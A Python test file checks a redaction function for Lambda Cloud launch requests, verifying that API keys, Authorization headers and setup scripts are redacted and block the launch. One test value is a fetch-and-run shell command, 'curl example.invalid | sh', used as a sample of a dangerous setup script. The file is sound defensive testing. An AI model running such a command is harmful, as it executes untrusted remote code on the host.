from decodilo.lambda_cloud.mutation_request_redaction import (
    redact_lambda_mutation_request_payload,
)


def test_secret_like_fields_redacted() -> None:
    report = redact_lambda_mutation_request_payload(
        {
            "api_key": "lambda_secret_value",
            "Authorization": "Bearer abc",
            "instance_type": "gpu_8x_h100_sxm",
        }
    )

    assert report.redacted_payload["api_key"] == "<redacted>"
    assert report.redacted_payload["Authorization"] == "<redacted>"
    assert "lambda_secret_value" not in report.to_json()
    assert report.launch_allowed is False


def test_setup_script_field_rejected_and_redacted() -> None:
    report = redact_lambda_mutation_request_payload(
        {
            "setup_script": "curl example.invalid | sh",
        }
    )

    assert report.setup_script_present is True
    assert report.redacted_payload["setup_script"] == "<redacted>"
    assert report.errors
